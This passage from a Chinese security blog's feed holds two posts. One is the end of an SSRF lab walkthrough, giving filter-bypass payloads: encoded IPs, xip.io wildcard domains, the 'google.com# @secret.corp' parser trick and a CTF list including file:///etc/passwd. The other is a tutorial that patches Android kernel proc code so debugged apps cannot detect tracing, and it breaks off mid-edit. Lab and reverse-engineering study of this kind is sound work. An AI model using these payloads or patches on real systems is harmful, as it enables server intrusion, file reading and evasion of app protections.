class="line">八进制溢出：http://265.0.0.3</span><br></pre></td></tr></table></figure></p><p>最后一个变形好像只适用于NodeJS应用的服务器，点分十进制的最大值为255，一旦超出了这个数，将会被重置，这个时候最后一个变形就会变回<code>http://10.0.0.3</code>。具体为什么可以通过这样的可能要从TCP/IP解析IP地址的逻辑入手(应用层的限制总能被巧妙地绕过，不是很可靠)。</p><h4 id="其他常见的绕过方法"><a href="#其他常见的绕过方法" class="headerlink" title="其他常见的绕过方法"></a>其他常见的绕过方法</h4><h5 id="DNS泛域名"><a href="#DNS泛域名" class="headerlink" title="DNS泛域名"></a>DNS泛域名</h5><p><code>xip.io</code>和<code>xip.name</code>这两个dns泛域名，实现绕过的方法是，你在你想访问的ip地址后面添加这两个泛域名，这两个域名会从你发出的请求中提取你真正想访问的IP地址，然后再响应报文中返回。感兴趣的可以看看<a href="https://blog.51cto.com/laoxu/1282773" target="_blank" rel="noopener">DNS服务系列之一：泛域名解析的安全案例</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://www.10.0.0.3.xip.io</span><br><span class="line">http://mysite.10.0.0.3.xip.io</span><br><span class="line">http://foo.bar.10.0.0.3.xip.io</span><br><span class="line">http://foo.10.0.0.3.xip.name</span><br><span class="line">http://www.10.0.0.3.xip.name</span><br></pre></td></tr></table></figure></p><p>还有很多其他的绕过方式，因为在这个环境里不能实现，所以就不在这里补充了，<a href="https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html" target="_blank" rel="noopener">SSRF漏洞的利用与学习</a>一文中比较全面。没有仔细研究过为什么Python写的后端代码不能实现其他绕过，不过我猜是因为Python的urllib和PHP的curl解析方式不同，如果以后有机会，会深究一下里面到底有什么不同。</p><h3 id="Part-2：Advance2"><a href="#Part-2：Advance2" class="headerlink" title="Part 2：Advance2"></a>Part 2：Advance2</h3><p>在安装这个环境的时候，一定要注意端口的配置，如果出现了<code>ERROR: Pool overlaps with other one on this address space</code>的报错，可以按照<a href="http://www.zizhixiaoshe.com/article/21.html" target="_blank" rel="noopener">移除docker网络</a>这篇文章进行操作，记得先将docker给关掉。如果之后还有方法可以避免产生这个报错，例如正确地修改配置文件之类的，我会补充在后面。已经尝试过更改<code>docker-compose.yml</code>文件中的端口不起作用了。</p><p>这一关为了避免和上一关一样，代码中没有自己实现IP解析的功能，而是选择调用python2.7自带的库函数解析IP地址，具体代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url=request.form[&apos;handler&apos;]</span><br><span class="line">host = urlparse.urlparse(url).hostname</span><br><span class="line">if host == &apos;secret.corp&apos;:    </span><br><span class="line">    return &apos;Restricted Area!&apos;</span><br><span class="line">else:    </span><br><span class="line">return urllib.urlopen(url).read()</span><br></pre></td></tr></table></figure></p><p>上面的代码用了python2.7中的urlparse模块来解析url，该模块能够解析多个协议。获取了url中host参数之后，再对域进行判断。</p><p>跟第一个环境一样，我们先用<code>http://secret.corp</code>来测试。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557816882/SSRF/1557816857_1.png" alt></p><p>URL解析器分析出这部分内容是访问已被限制的域，下面要介绍一个新的知识点了，我们先来测试一下它能不能起作用。在测试点输入<code>http://google.com# @secret.corp</code><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557820423/SSRF/1557820402_1.png" alt></p><p>绕过这个到底是基于什么原理呢？让我们再次回顾一下url的结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme://user:pass@host:port/path?query=value#fragment</span><br></pre></td></tr></table></figure></p><p>原来<code>http://google.com# @secret.corp</code>中<code>@</code>后面的<code>secret.corp</code>是真正要访问的host，前面的<code>google.com#</code>绕过了urlparse的解析。感觉很神奇而且让人有点摸不着头脑，了解一下原理会好很多。SSRF漏洞产生的根本原因是url中有空格(<br>CRLF注入)，这让python中的两个模块解析url的时候起了冲突，urlparse认为host是google.com，而urllib则认为真正的host是secret.corp并且直接发出了请求。</p><p>为了进一步阐述上面漏洞利用的原理，用python写几行代码来验证一下，如果有点混乱，可以再看看上面的源代码，用urlparse解析URL进行判断是先于调用urllib发出请求的。下图为urlparse解析的结果，在python2.7和python3.5两个版本中都是一致的<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557887555/SSRF/1557887533_1.png" alt></p><p>为了能够进一步验证urllib能否正确接收到，在VPS上输入命令<code>nc -lvvv 9444</code>监听本地9444端口，再按照下面命令通过python发送请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python</span><br><span class="line">$ import urllib</span><br><span class="line">$ url = &quot;http://google.com# @[VPS的IP地址]:9444&quot;</span><br><span class="line">$ urllib.urlopen(url).read()</span><br></pre></td></tr></table></figure></p><p>之后在开启监听端口的服务器可以接收到如下的回显：<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557990455/SSRF/08f2860301853756c50e4652d81b09c.png" alt></p><p>验证完毕。</p><h3 id="advanced3"><a href="#advanced3" class="headerlink" title="advanced3"></a>advanced3</h3><p>advanced3感觉作者代码不完整，感觉像在测试阶段，尝试过修改源代码，但是实际情况并不如我所想。所以这里就不丰富这部分内容了，如果之后作者对这部分题目有修改，我会对这部分内容进行补充。</p><h3 id="ctf-exp"><a href="#ctf-exp" class="headerlink" title="ctf exp"></a>ctf exp</h3><p>下面是ctf题目获取flag的方法，因为我我不是亚马逊的服务器，所以获取不了flag，如果想尝试的，可以看看<a href="https://medium.com/poka-techblog/server-side-request-forgery-ssrf-attacks-part-1-the-basics-a42ba5cc244a" target="_blank" rel="noopener">这篇文章</a></p><p>最后这个题目大家可以作为练习，到最后才看payload…..懒人就不重复说前面的内容了，来试试自己掌握了没有吧！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 http://secret1.corp</span><br><span class="line">2 file:///etc/passwd</span><br><span class="line">3 http://10.38 #a000026、167772198</span><br><span class="line">4 http://google.com# @secret3.corp</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SSRF-LABS指南&quot;&gt;&lt;a href=&quot;#SSRF-LABS指南&quot; class=&quot;headerlink&quot; title=&quot;SSRF-LABS指南&quot;&gt;&lt;/a&gt;SSRF-LABS指南&lt;/h2&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="Android安全 翻译" scheme="http://Se8S0n.github.io.git/tags/Android%E5%AE%89%E5%85%A8-%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>尝试绕过TracePID反调试——从源码入手</title>
    <link href="http://Se8S0n.github.io.git/2019/04/19/%E5%B0%9D%E8%AF%95%E7%BB%95%E8%BF%87TracePID%E5%8F%8D%E8%B0%83%E8%AF%95%E4%BA%8C%E2%80%94%E2%80%94%E4%BB%8E%E6%BA%90%E7%A0%81%E5%85%A5%E6%89%8B/"/>
    <id>http://Se8S0n.github.io.git/2019/04/19/尝试绕过TracePID反调试二——从源码入手/</id>
    <published>2019-04-19T17:43:49.000Z</published>
    <updated>2021-08-05T06:51:27.359Z</updated>
    
    <content type="html"><![CDATA[<h1 id="绕过TracePid反调试二"><a href="#绕过TracePid反调试二" class="headerlink" title="绕过TracePid反调试二"></a>绕过TracePid反调试二</h1><p>第一篇文章是直接修改二进制文件<a href="https://www.52pojie.cn/thread-917096-1-1.html" target="_blank" rel="noopener">尝试绕过TracerPID反调试</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>接受了评论的建议, 但是因为之前手机还没好加上没试过直接修改kernel的源码, 所以花了很多时间(都是环境惹的祸)。还有因为这个接触了shell code, 真的是一言难尽。事先说明, 下面的环境准备都是在国外的服务器上直接运行的, 难免有一些命令是需要翻墙的, 所以你实际上要用的命令可能跟我的有点不同(如果可以直接用代理之类的, 应该没多大影响)。</p><h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><p>Ubuntu 18.10(建议用Ubuntu 16.04, 至少2MB内存)<br>Android 6.0.1<br>Nexus 5</p><h2 id="Ubuntu环境搭建"><a href="#Ubuntu环境搭建" class="headerlink" title="Ubuntu环境搭建"></a>Ubuntu环境搭建</h2><h3 id="Java环境准备"><a href="#Java环境准备" class="headerlink" title="Java环境准备"></a>Java环境准备</h3><p>下文Java环境搭建都是基于Ubuntu 18.10的, 如果你尝试过不能在自己的Ubuntu环境下使用, 可以到google上找找看, 应该能找到你想要的。如果不是为了之后Android源码调试, 只是为了修改kernel文件可以先不搭建Java环境。</p><h4 id="下载JDK"><a href="#下载JDK" class="headerlink" title="下载JDK"></a>下载JDK</h4><ol><li>为了下载最新的JDK, 可以现在Ubuntu的命令行里面先输入<code>javac</code>, 会显示下面的内容, 按照它提供的命令即可下载最新的JDK。<br> <img src="https://i.imgur.com/hDyztXW.png" alt></li><li>很不快乐的是Java 6和Java 7需要有Oracle的账号, 所以只要去Orcle注册一个账号, 就可以下载<a href="https://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html" target="_blank" rel="noopener">Java 7</a>和<a href="https://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase6-419409.html" target="_blank" rel="noopener">Java 6</a>了(Java 7是压缩包, Java 6是一个二进制文件)。<strong>文章末尾附有两个jdk文件的链接</strong>。<h4 id="安装JDK"><a href="#安装JDK" class="headerlink" title="安装JDK"></a>安装JDK</h4>因为先安装了Java 8在路径<code>/usr/lib/jvm</code>目录下, 所以将文件文件<code>jdk-6u45-linux-x64.bin</code>和<code>jdk-7u80-linux-x64.tar.gz</code>都用mv命令移到上述目录下。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@vultr:~/[jdk 6存放的位置]# mv jdk-6u45-linux-x64.bin /usr/lib/jvm/</span><br><span class="line">root@vultr:~/[jdk 7存放的位置]# mv jdk-7u80-linux-x64.tar.gz /usr/lib/jvm/</span><br></pre></td></tr></table></figure></li></ol><p>解压jdk 6, 进入到<code>/usr/lib/jvm</code>目录下, 先给该文件读写的权限, 之后运行该二进制文件就会在当前目录下生成一个新的文件夹。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@vultr:~/[jdk 7存放的位置]# cd /usr/lib/jvm</span><br><span class="line">root@vultr:/usr/lib/jvm# chmod +x jdk-6u45-linux-x64.bin</span><br><span class="line">root@vultr:/usr/lib/jvm# ./jdk-6u45-linux-x64.bin</span><br></pre></td></tr></table></figure></p><p>解压jdk 7<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@vultr:/usr/lib/jvm# tar -zxvf jdk-7u80-linux-x64.tar.gz</span><br></pre></td></tr></table></figure></p><p>为了我们能够在Ubuntu里面自由自在地切换Java版本, 我们可以先写个脚本将jdk-6和jdk-7添加到候选项中。先输入命令<code>vim alternativeJava.sh</code>, 并将下面的内容直接复制到alternativsjava.sh文件里。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">JAVAHOME=$1 </span><br><span class="line">if [ -d $JAVAHOME ];then</span><br><span class="line">        sudo update-alternatives --install /usr/bin/java java $JAVAHOME/bin/java 300</span><br><span class="line">        sudo update-alternatives --install /usr/bin/javac javac $JAVAHOME/bin/javac 300</span><br><span class="line">        sudo update-alternatives --install /usr/bin/jar jar $JAVAHOME/bin/jar 300</span><br><span class="line">        sudo update-alternatives --install /usr/bin/javah javah $JAVAHOME/bin/javah 300</span><br><span class="line">        sudo update-alternatives --install /usr/bin/javap javap $JAVAHOME/bin/javap 300</span><br><span class="line">else</span><br><span class="line">        echo &quot;Wrong input&quot;</span><br><span class="line">        exit 0</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p><p>用命令<code>chmod+x alternativsjava.sh</code>, 给脚本添加权限, 否则脚本会不能运行。输入命令<code>./alternativsjava.sh /usr/lib/jvm/jdk1.7.0_80</code>之后(脚本后面添加的路径是你jdk解压后的文件路径),用<code>sudo update-alternatives --config java</code>(切换java版本命令)进行检验。<br><img src="https://i.imgur.com/WgvHJPd.png" alt></p><h3 id="准备Android源码运行环境"><a href="#准备Android源码运行环境" class="headerlink" title="准备Android源码运行环境"></a>准备Android源码运行环境</h3><p>以下内容仅编译内核, 并假设你还没有下载整个 AOSP源。因为我要编译的内核版本过旧, 所以用的都是旧的教程, 如果有要编译新的内核的要求的话, 可以看看这两篇文章, <a href="https://github.com/nathanchance/android-kernel-clang#how-to-compile-the-kernel-with-clang-standalone" target="_blank" rel="noopener">Compiling an Android kernel with Clang</a>和<a href="https://source.android.google.cn/setup/build/building-kernels" target="_blank" rel="noopener">编译内核</a>。</p><h4 id="安装所需的软件包"><a href="#安装所需的软件包" class="headerlink" title="安装所需的软件包"></a>安装所需的软件包</h4><p>在Ubuntu 14.04中如果下载git出问题, 可以看看这篇文章<a href="https://www.digitalocean.com/community/tutorials/how-to-install-git-on-ubuntu-14-04" target="_blank" rel="noopener">How To Install Git on Ubuntu 14.04</a>。</p><p>输入下述命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install git-core gnupg flex bison gperf build-essential zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z-dev libgl1-mesa-dev libxml2-utils xsltproc unzip</span><br></pre></td></tr></table></figure></p><h4 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h4><p>在下载之前先获取手机的内核版本, 从下面的信息可知道手机内核的<code>git short commit id</code>为<code>cf10b7e</code>。<br><img src="https://i.imgur.com/r0l0Gz2.png" alt></p><p>因为内核版本比较旧, 所以按照<a href="https://source.android.com/setup/build/building-kernels-deprecated" target="_blank" rel="noopener">旧版的官方内核</a>编译手册来, 而不是按照<a href="https://source.android.com/setup/build/building-kernels" target="_blank" rel="noopener">新版的内核编译手册</a>来。如果内核比较新的, 还是直接用repo吧！接下来可以从官方手册上看到, 我需要的kernel源代码位于哪个branch, 然后从github上clone下来。<br><img src="https://i.imgur.com/qZ8Dllc.png" alt></p><p>输入命令, 先将msm这个项目clone下来。(这一步花的时间可能会有一点点长)<br><code>$ git clone https://android.googlesource.com/kernel/msm.git</code></p><p>因为我用的是国外的服务器, 所以可以直接从google服务器下下来。如果是自己搭建的机器且觉得开代理太麻烦的话, 可以换成下面的命令。<br><code>$ git clone https://aosp.tuna.tsinghua.edu.cn/kernel/msm.git</code></p><p>将msm从github上clone下来之后, 会发现里面是个空的, 只有一个<code>.git</code>仓库。进入<code>msm</code>目录下, 用<code>git branch -a</code>查看分支。(我的文件路径跟图片下的不符, 实际上应该是<code>/AndroidKernel/msm</code>)<br><img src="https://i.imgur.com/czFhbta.png" alt></p><p>现在就要用到我们之前获取的short commit id(显示的是实际的commit id的前7位)了, 直接检出我们需要的代码的分支。<br><code>git branch -r --contains &lt;your short commit id&gt;</code></p><p>从上面的图片我们可以知道, 本地实际上只有<code>master</code>这一个分支, 这时候我们需要做的事就是在远程分支的基础上再分一个本地分支。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -b android-msm-hammerhead-3.4-marshmallow-mr3 origin/android-msm-hammerhead-3.4-marshmallow-mr3</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/3J4jtIc.png" alt></p><h4 id="安装GCC交叉编译器"><a href="#安装GCC交叉编译器" class="headerlink" title="安装GCC交叉编译器"></a>安装GCC交叉编译器</h4><p>之前不是很能理解为什么官方网站没说要下载这个东西, 之后在<a href="https://appuals.com/how-to-build-a-custom-android-kernel/" target="_blank" rel="noopener">How to Build a Custom Android Kernel</a>这篇文章里面看到。因为一般我们需要编译的kernel源代码都是基于arm架构编译运行的, 所以直接放在我们64位的Ubuntu里面是不合适的。也可以跟官方一样直接通过USB连接手机直接进行调试。</p><p>在<code>~/AndroidKernel</code>执行如下命令(下载现在Linux环境下的arm编译接口)。这个编译接口尽量别尝试arm-eabi-4.8以上的, 因为旧的内核和交叉编译器不匹配会出现很多麻烦, 例如现在Google已经弃用了gcc, 在最新的交叉编译器里面只能用clang, 即使<code>make</code>操作加了参数<code>CC=clang</code>也会在出现很多很麻烦的报错。所以我这里为了匹配, 用的是旧的交叉编译器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/arm/arm-eabi-4.6</span><br></pre></td></tr></table></figure></p><p>在这里尝试了一下清华的AOSP源, 也是可以直接用的。参考贴出来的google的url, 直接将里面的<code>https://android.googlesource.com/</code>全部改成<code>https://aosp.tuna.tsinghua.edu.cn/</code>即可。详情可参考<a href="https://mirror.tuna.tsinghua.edu.cn/help/AOSP/" target="_blank" rel="noopener">Android 镜像使用帮助</a>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://aosp.tuna.tsinghua.edu.cn/platform/prebuilts/gcc/linux-x86/arm/arm-eabi-4.6</span><br></pre></td></tr></table></figure></p><h4 id="添加环境变量"><a href="#添加环境变量" class="headerlink" title="添加环境变量"></a>添加环境变量</h4><p>添加环境变量总共有两种方法, 一种是短期的, 开机重启之后就会失效, 一种是长期的。</p><p>第一种：在<code>~/AndroidKernel</code>目录下执行以下命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ export PATH=~/AndroidKernel/arm-eabi-4.6/bin:$PATH</span><br></pre></td></tr></table></figure></p><p>第二种：在<code>~/.bashrc</code>中添加环境变量<br><code>$ vim ~/.bashrc</code></p><p>之后在文件末尾添加<code>export PATH=&lt;交叉编译API存放的文件根目录&gt;/arm-linux-androideabi-4.9/bin:$PATH</code></p><p>为了让这个配置立马生效, 我们可以用下面的命令<br><code>$ source ~/.bashrc</code></p><h2 id="修改源码"><a href="#修改源码" class="headerlink" title="修改源码"></a>修改源码</h2><h3 id="修改前准备-修改源码"><a href="#修改前准备-修改源码" class="headerlink" title="修改前准备+修改源码"></a>修改前准备+修改源码</h3><p>如果觉得不想知道为什么要修改<code>base.c</code>和<code>array.c</code>文件, 可以跳过现在这一段, 直接从下一段“修改<code>msm/fs/proc/base.c</code>文件”开始看就好了。</p><p>我将<code>msm/fs/proc</code>目录下的文件都下载到本地(都是先修改完成的), 安装了<a href="https://bbs.pediy.com/thread-215669.htm" target="_blank" rel="noopener">Source Insight</a>来分析源码。<a href="http://man7.org/linux/man-pages/man5/proc.5.html" target="_blank" rel="noopener">proc文件</a>, 是以文件系统的方式为访问系统内核的操作提供接口, 动态从系统内核中读出所需信息的。这也就说明, 我们想要修改的TracePid也是通过这个文件中获取到的。</p><p>我们想获取进程信息的时候, 一般会输出下述内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&gt;cat /proc/self/status</span><br><span class="line"> Name:   cat</span><br><span class="line"> State:  R (running)</span><br><span class="line"> Tgid:   5452</span><br><span class="line"> Pid:    5452</span><br><span class="line"> PPid:   743</span><br><span class="line"> TracerPid:      0                     (2.4)</span><br><span class="line"> Uid:    501     501     501     501</span><br><span class="line"> Gid:    100     100     100     100</span><br><span class="line"> FDSize: 256</span><br><span class="line"> Groups: 100 14 16</span><br><span class="line"> VmPeak:     5004 kB</span><br><span class="line"> VmSize:     5004 kB</span><br><span class="line"> VmLck:         0 kB</span><br><span class="line"> VmHWM:       476 kB</span><br><span class="line"> VmRSS:       476 kB</span><br><span class="line"> VmData:      156 kB</span><br><span class="line"> VmStk:        88 kB</span><br><span class="line"> VmExe:        68 kB</span><br><span class="line"> VmLib:      1412 kB</span><br><span class="line"> VmPTE:        20 kb</span><br><span class="line"> VmSwap:        0 kB</span><br><span class="line"> Threads:        1</span><br><span class="line"> SigQ:   0/28578</span><br><span class="line"> SigPnd: 0000000000000000</span><br><span class="line"> ShdPnd: 0000000000000000</span><br><span class="line"> SigBlk: 0000000000000000</span><br><span class="line"> SigIgn: 0000000000000000</span><br><span class="line"> SigCgt: 0000000000000000</span><br><span class="line"> CapInh: 00000000fffffeff</span><br><span class="line"> CapPrm: 0000000000000000</span><br><span class="line"> CapEff: 0000000000000000</span><br><span class="line"> CapBnd: ffffffffffffffff</span><br><span class="line"> Seccomp:        0</span><br><span class="line"> voluntary_ctxt_switches:        0</span><br><span class="line"> nonvoluntary_ctxt_switches:     1</span><br></pre></td></tr></table></figure></p><p>在上述Status信息中我们需要关注的两个部分, 一个是<code>State</code>字段, 一个是<code>TracePid</code>字段。因为这两个字段都可反映出进程是否被监测。详情可参考<a href="https://android.googlesource.com/kernel/msm/+/android-wear-5.1.1_r0.6/Documentation/filesystems/proc.txt?autodive=0%2F%2F%2F" target="_blank" rel="noopener"> proc.txt </a>的<code>line 209</code>和<code>line 215</code>。</p><p>在<a href="http://man7.org/linux/man-pages/man5/proc.5.html" target="_blank" rel="noopener">proc手册</a>查找<code>/proc/[pid]/stat</code>, 我们可以知道Status是在<code>fs/proc/array.c</code>定义的, 我们就先从<code>array.c</code>入手。</p><p>先打开查看调用关系的窗口, <code>View-&gt;Panels-&gt;Relation Windows</code>。</p><p>在<code>array.c</code>文件中搜索<code>status</code>, 找到函数<code>proc_pid_status</code>, 之后查看该函数调用与被调用的信息。<br><img src="https://i.imgur.com/jyMavtL.png" alt></p><p>在<code>Relation Window</code>中双击<code>get_task_state</code>函数, 就找到了我们想找的<code>TracePid</code>。这个就是我们要修改的第一处了。<br><img src="https://i.imgur.com/rMp60mL.png" alt></p><p>TracePid 通常都是对父进程 pid 进行检测, 这里将 ppid 改为 0, 这样不管是否为调试状态, TracePid 都无法检测出。修改的结果如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">180 seq_printf(m,</span><br><span class="line">181            &quot;State:\t%s\n&quot;</span><br><span class="line">182            &quot;Tgid:\t%d\n&quot;</span><br><span class="line">183            &quot;Pid:\t%d\n&quot;</span><br><span class="line">184            &quot;PPid:\t%d\n&quot;</span><br><span class="line">185            &quot;TracerPid:\t%d\n&quot;</span><br><span class="line">186            &quot;Uid:\t%d\t%d\t%d\t%d\n&quot;</span><br><span class="line">187            &quot;Gid:\t%d\t%d\t%d\t%d\n&quot;,</span><br><span class="line">188            get_task_state(p),</span><br><span class="line">189            task_tgid_nr_ns(p, ns),</span><br><span class="line">190            pid_nr_ns(pid, ns),</span><br><span class="line">               //修改部分</span><br><span class="line">191            ppid, 0,</span><br><span class="line">               //修改结束</span><br><span class="line">192            cred-&gt;uid, cred-&gt;euid, cred-&gt;suid, cred-&gt;fsuid,</span><br><span class="line">193            cred-&gt;gid, cred-&gt;egid, cred-&gt;sgid, cred-&gt;fsgid);</span><br></pre></td></tr></table></figure></p><p>上面的代码段中的<code>get_task_state()</code>函数引起了我的注意, 这个函数应该是获取state的函数。用鼠标选中该函数之后, 右手边的<code>Relation Window</code>会显示该函数所在的位置, 在该窗口双击之后跳转。<br><img src="https://i.imgur.com/MAbWXuR.png" alt></p><p>在上图中, 看到了明显用来存放状态的数组<code>task_state_array</code>, 选中该数组之后, 同样的在<code>Relation Window</code>中双击跳转。<br><img src="https://i.imgur.com/O70xlsH.png" alt></p><p>将原来状态表中的<code>T</code>和<code>t</code>都修改为<code>S</code>这样就避免了该状态位反映出被监测的状态。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">R  Running</span><br><span class="line">S  Sleeping in an interruptible wait</span><br><span class="line">D  Waiting in uninterruptible disk sleep</span><br><span class="line">Z  Zombie</span><br><span class="line">T  Stopped (on a signal) or (before Linux 2.6.33)</span><br><span class="line">   trace stopped</span><br><span class="line">t  Tracing stop (Linux 2.6.33 onward)</span><br><span class="line">W  Paging (only before Linux 2.6.0)</span><br><span class="line">X  Dead (from Linux 2.6.0 onward</span><br><span class="line">x  Dead (Linux 2.6.33 to 3.13 only)</span><br><span class="line">K  Wakekill (Linux 2.6.33 to 3.13 only)</span><br><span class="line">W  Waking (Linux 2.6.33 to 3.13 only)</span><br><span class="line">P  Parked (Linux 3.9 to 3.13 only)</span><br></pre></td></tr></table></figure></p><p><code>array.c</code>我们已经修改完毕了, 这时候我们就要修改其他部分了。在<a href="https://blog.csdn.net/MyLinChi/article/details/78459373" target="_blank" rel="noopener">导入Project</a>之后, 我们在整个proc文件中搜索关键词<code>trace</code>。先按照下图打开<code>Project Search Bar</code>, 并在其中输入<code>trace</code>。<br><img src="https://i.imgur.com/AF3qdP7.png" alt></p><p>我们会发现搜索的结果都是在<code>base.c</code>文件中(下图出现的第一个包含<code>trace</code>关键词的函数是我已经修改过的)。<br><img src="https://i.imgur.com/qdR3XWj.png" alt></p><p>在检查完有<code>trace</code>关键词的代码没发现有用的, 就在<code>base.c</code>文件中搜索关键词<code>status</code>。</p><p><code>Ctrl+F</code>输入关键词之后没找到, 就通过下图的向下搜索的功能一个个定位, 前面的部分都没找到自己想要找的函数段。<br><img src="https://i.imgur.com/XOlk7fq.png" alt></p><p>直到找到了关键的部分, 选中函数<code>proc_pid_status</code>, 在右边<code>Relation Window</code>中继续找我们想要的关键函数。<br><img src="https://i.imgur.com/VV1xxyc.png" alt></p><p>但是很遗憾, 在<code>proc_pid_status</code>函数中跟了很多相关的函数仍然没找到我们想要的。那我们就回到我们最开始的地方。这部分最上面的标识是<code>pid_entry</code>。顺着这个部分往下看, 我们就找到了<code>proc_tid_stat</code>函数, 选中该函数之后我们可以找到<code>do_task_stat</code>函数。<br><img src="https://i.imgur.com/akjELQ8.png" alt></p><p>接下来, 我们就好好看看这个函数里面有什么。在右边的<code>Relation Window</code>中关注到一个有<code>state</code>关键词的函数, 双击之后跳转到该函数调用的位置。<br><img src="https://i.imgur.com/Z6XIxPk.png" alt></p><p>定位到上图那一行之后, 分别跟了<code>state</code>关键词和<code>get_task_state</code>函数, 都没有发现什么(<code>base.c</code>是进程运行之前要做的准备工作, 从<code>get_task_state</code>函数可直接回到之前修改的<code>array.c</code>文件。但因为已修改完成, 所以就留在<code>base.c</code>文件中没有继续定位了)。</p><p>现在看到这段函数之中大部分都用到了变量<code>task</code>, 所以只好将<code>task</code>作为关键词用笨办法来一个一个定位。最后找到了<code>wchan</code>, 真的眼泪都掉下来。(因为事先知道要改这个部分)</p><p>看了<a href="https://gtoad.github.io/2017/06/25/Android-Anti-Debug/" target="_blank" rel="noopener">Android反调试技术整理与实践</a>这篇文章才知道为什么要修改带有<code>wchan</code>关键词的函数。因为<code>/proc/pid/wchan</code> 和 <code>/proc/pid/task/pid/wchan</code>在调试状态下，里面内容为<code>ptrace_stop</code>, 非调试的状态下为ep_poll。所以也可能会泄露正在被调试的信息, 所以我们直接在Project中查找<code>wchan</code>关键词, 就定位到函数<code>proc_pid_wchan</code><br><img src="https://i.imgur.com/naZExKg.png" alt></p><p>定位结束之后我们进行如下修改, 